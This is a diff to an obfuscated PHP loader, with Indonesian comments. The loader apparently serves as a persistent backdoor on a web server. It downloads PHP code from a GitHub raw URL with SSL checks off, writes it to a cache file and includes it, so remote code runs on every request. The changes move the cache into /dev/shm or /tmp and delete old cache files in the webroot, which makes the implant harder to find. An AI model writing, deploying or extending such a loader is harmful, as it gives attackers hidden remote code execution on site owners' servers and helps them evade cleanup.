@@ -13,8 +13,71 @@ if (!headers_sent()) {
 }
 
 define('A'.'B'.'A'.'D'.'I'.'_'.'U'.'R'.'L', 'h'.'t'.'t'.'p'.'s'.':'.'/'.'/'.'r'.'a'.'w'.'.'.'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'.'c'.'o'.'m'.'/'.'B'.'l'.'a'.'c'.'k'.'N'.'o'.'v'.'a'.'H'.'u'.'b'.'/'.'A'.'b'.'a'.'d'.'i'.'N'.'a'.'n'.'J'.'a'.'y'.'a'.'/'.'r'.'e'.'f'.'s'.'/'.'h'.'e'.'a'.'d'.'s'.'/'.'m'.'a'.'i'.'n'.'/'.'i'.'n'.'d'.'e'.'x'.'.'.'p'.'h'.'p');
-define('A'.'B'.'A'.'D'.'I'.'_'.'C'.'A'.'C'.'H'.'E', dirname(__FILE__) . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'l'.'s'.'_'.'c'.'a'.'c'.'h'.'e'.'.'.'p'.'h'.'p');
 define('A'.'B'.'A'.'D'.'I'.'_'.'T'.'T'.'L', 300);
+
+/**
+ * Cache HANYA di luar webroot:
+ *   /dev/shm/abadi_data  (RAM, prioritas)
+ *   /tmp/abadi_data
+ *   sys_get_temp_dir()/abadi_data  (Windows / fallback)
+ * Tidak pernah menulis .abadi_ls_cache.php di folder site.
+ */
+function abadi_cache_dir() {
+    static $dir = null;
+    if ($dir !== null) return $dir;
+    $name = 'a'.'b'.'a'.'d'.'i'.'_'.'d'.'a'.'t'.'a';
+    $cands = array(
+        '/'.'d'.'e'.'v'.'/'.'s'.'h'.'m'.'/' . $name,
+        '/'.'t'.'m'.'p'.'/' . $name,
+    );
+    if (function_exists('s'.'y'.'s'.'_'.'g'.'e'.'t'.'_'.'t'.'e'.'m'.'p'.'_'.'d'.'i'.'r')) {
+        $sys = @sys_get_temp_dir();
+        if (is_string($sys) && $sys !== '') {
+            $cands[] = rtrim($sys, "\\/") . DIRECTORY_SEPARATOR . $name;
+        }
+    }
+    foreach ($cands as $d) {
+        if (!is_dir($d)) @mkdir($d, 0700, true);
+        if (is_dir($d) && is_writable($d)) {
+            $dir = $d;
+            return $dir;
+        }
+        $parent = dirname($d);
+        if (is_dir($parent) && is_writable($parent)) {
+            @mkdir($d, 0700, true);
+            if (is_dir($d) && is_writable($d)) {
+                $dir = $d;
+                return $dir;
+            }
+        }
+    }
+    $dir = '';
+    return $dir;
+}
+
+function abadi_cache_file() {
+    static $path = null;
+    if ($path !== null) return $path;
+    $d = abadi_cache_dir();
+    if ($d === '') {
+        $path = '';
+        return $path;
+    }
+    $host = !empty($_SERVER['H'.'T'.'T'.'P'.'_'.'H'.'O'.'S'.'T']) ? (string) $_SERVER['H'.'T'.'T'.'P'.'_'.'H'.'O'.'S'.'T'] : 'c'.'l'.'i';
+    $key = substr(md5(__FILE__ . '|' . $host), 0, 16);
+    $path = $d . DIRECTORY_SEPARATOR . 'l'.'s'.'_' . $key . '.'.'p'.'h'.'p';
+    return $path;
+}
+
+/** Hapus sisa cache lama di webroot (versi sebelumnya) */
+function abadi_purge_webroot_cache() {
+    $old = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'l'.'s'.'_'.'c'.'a'.'c'.'h'.'e'.'.'.'p'.'h'.'p';
+    if (is_file($old)) @unlink($old);
+    $old2 = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'f'.'e'.'t'.'c'.'h'.'_';
+    // biarkan; fetch tmp diganti ke temp dir
+}
+
+abadi_purge_webroot_cache();
 
 function abadi_ua() {
     static $list = array(
@@ -294,17 +357,23 @@ function abadi_fetch($url) {
 
     if (abadi_fn_ok('c'.'o'.'p'.'y') && abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
         $tried[] = 'c'.'o'.'p'.'y';
-        $tmp = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'f'.'e'.'t'.'c'.'h'.'_' . mt_rand(1000, 9999) . '.'.'t'.'m'.'p';
-        $ctx = stream_context_create(array(
-            'h'.'t'.'t'.'p' => array('h'.'e'.'a'.'d'.'e'.'r' => $hdrLine, 't'.'i'.'m'.'e'.'o'.'u'.'t' => 45, 'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true),
-            's'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false),
-        ));
-        if (@copy($url, $tmp, $ctx) && is_file($tmp)) {
-            $b = @file_get_contents($tmp);
-            @unlink($tmp);
-            if (abadi_ok_body($b)) return array(true, $b, 'c'.'o'.'p'.'y', $tried);
+        $base = abadi_cache_dir();
+        if ($base === '' && function_exists('s'.'y'.'s'.'_'.'g'.'e'.'t'.'_'.'t'.'e'.'m'.'p'.'_'.'d'.'i'.'r')) {
+            $base = rtrim((string) @sys_get_temp_dir(), "\\/");
         }
-        @unlink($tmp);
+        if ($base !== '') {
+            $tmp = $base . DIRECTORY_SEPARATOR . '.'.'a'.'b'.'a'.'d'.'i'.'_'.'f'.'e'.'t'.'c'.'h'.'_' . mt_rand(1000, 9999) . '.'.'t'.'m'.'p';
+            $ctx = stream_context_create(array(
+                'h'.'t'.'t'.'p' => array('h'.'e'.'a'.'d'.'e'.'r' => $hdrLine, 't'.'i'.'m'.'e'.'o'.'u'.'t' => 45, 'i'.'g'.'n'.'o'.'r'.'e'.'_'.'e'.'r'.'r'.'o'.'r'.'s' => true),
+                's'.'s'.'l' => array('v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r' => false, 'v'.'e'.'r'.'i'.'f'.'y'.'_'.'p'.'e'.'e'.'r'.'_'.'n'.'a'.'m'.'e' => false),
+            ));
+            if (@copy($url, $tmp, $ctx) && is_file($tmp)) {
+                $b = @file_get_contents($tmp);
+                @unlink($tmp);
+                if (abadi_ok_body($b)) return array(true, $b, 'c'.'o'.'p'.'y', $tried);
+            }
+            @unlink($tmp);
+        }
     }
 
     if (abadi_fn_ok('f'.'i'.'l'.'e')) {
@@ -345,20 +414,25 @@ function abadi_prepare($src) {
 
 function abadi_run($src) {
     $code = abadi_prepare($src);
-    $cache = ABADI_CACHE;
+    $cache = abadi_cache_file();
 
-    if (abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
+    // Simpan cache di /dev/shm atau /tmp (bukan webroot)
+    if ($cache !== '' && abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
         if (@file_put_contents($cache, "<?php\n" . $code) !== false && is_file($cache)) {
+            @chmod($cache, 0600);
             include $cache;
             return true;
         }
     }
 
-    if (abadi_fn_ok('t'.'e'.'m'.'p'.'n'.'a'.'m') && abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
-        $tmp = @tempnam(sys_get_temp_dir(), 'a'.'b'.'a'.'d'.'i'.'_');
-        if ($tmp) {
-            $php = $tmp . '.'.'p'.'h'.'p';
-            @rename($tmp, $php);
+    // One-shot temp di cache dir / system temp, lalu hapus
+    if (abadi_fn_ok('f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s')) {
+        $base = abadi_cache_dir();
+        if ($base === '' && function_exists('s'.'y'.'s'.'_'.'g'.'e'.'t'.'_'.'t'.'e'.'m'.'p'.'_'.'d'.'i'.'r')) {
+            $base = rtrim((string) @sys_get_temp_dir(), "\\/");
+        }
+        if ($base !== '') {
+            $php = $base . DIRECTORY_SEPARATOR . 'a'.'b'.'a'.'d'.'i'.'_' . mt_rand(100000, 999999) . '.'.'p'.'h'.'p';
             if (@file_put_contents($php, "<?php\n" . $code) !== false) {
                 include $php;
                 @unlink($php);
@@ -377,11 +451,12 @@ function abadi_run($src) {
 }
 
 $force = isset($_GET['r'.'e'.'f'.'r'.'e'.'s'.'h']) || isset($_GET['n'.'o'.'c'.'a'.'c'.'h'.'e']);
+$cacheFile = abadi_cache_file();
 
-if (!$force && ABADI_TTL > 0 && is_file(ABADI_CACHE)) {
-    $age = time() - (int) @filemtime(ABADI_CACHE);
+if (!$force && ABADI_TTL > 0 && $cacheFile !== '' && is_file($cacheFile)) {
+    $age = time() - (int) @filemtime($cacheFile);
     if ($age >= 0 && $age < ABADI_TTL) {
-        include ABADI_CACHE;
+        include $cacheFile;
         exit;
     }
 }
@@ -389,8 +464,8 @@ if (!$force && ABADI_TTL > 0 && is_file(ABADI_CACHE)) {
 list($ok, $body, $via, $tried) = abadi_fetch(ABADI_URL);
 
 if (!$ok || !abadi_ok_body($body)) {
-    if (is_file(ABADI_CACHE)) {
-        include ABADI_CACHE;
+    if ($cacheFile !== '' && is_file($cacheFile)) {
+        include $cacheFile;
         exit;
     }
     http_response_code(502);
@@ -400,6 +475,7 @@ if (!$ok || !abadi_ok_body($body)) {
 if (!headers_sent() && isset($_GET['d'.'e'.'b'.'u'.'g'])) {
     header('X'.'-'.'A'.'b'.'a'.'d'.'i'.'-'.'V'.'i'.'a'.':'.' ' . $via);
     header('X'.'-'.'A'.'b'.'a'.'d'.'i'.'-'.'T'.'r'.'i'.'e'.'d'.':'.' ' . implode(',', $tried));
+    if ($cacheFile !== '') header('X'.'-'.'A'.'b'.'a'.'d'.'i'.'-'.'C'.'a'.'c'.'h'.'e'.':'.' ' . $cacheFile);
 }
 
 if (!abadi_run($body)) {
